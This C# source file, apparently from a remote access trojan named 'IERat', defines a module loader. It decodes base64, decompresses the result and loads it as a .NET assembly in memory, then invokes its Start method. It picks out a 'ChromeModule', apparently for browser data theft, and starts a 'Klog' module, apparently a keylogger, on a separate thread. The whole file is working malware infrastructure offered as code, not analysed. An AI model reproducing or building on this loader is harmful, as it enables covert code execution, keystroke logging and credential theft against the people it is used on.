using System;
using System.Reflection;
using System.Threading;

namespace IERat.lib
{
    class Modules
    {
        public static object LoadModule(string ModuleData, string cmdType = "")
        {
            Assembly assembly = Assembly.Load(Utils.Decompress(Convert.FromBase64String(ModuleData)));
            var TypesEnumerator = assembly.ExportedTypes.GetEnumerator();
            TypesEnumerator.MoveNext();
            var Type = TypesEnumerator.Current;
            if (cmdType == "chrome") 
            { 
                while (Type.FullName != "ChromeModule.ChromeModule")
                {
                    TypesEnumerator.MoveNext();
                    Type = TypesEnumerator.Current;
                }
            }
            var Start = Type.GetMethod("Start");
            if (Type.Name.Contains("Klog"))
            {
                Thread ModuleThreadTest = new Thread(() => StartMethod(Start));
                return ModuleThreadTest;
            }
            else
            {
                return Start;
            }
        }
        public static void StartMethod(MethodInfo methodInfo)
        {
            methodInfo.Invoke(null, null);
        }
    }
}
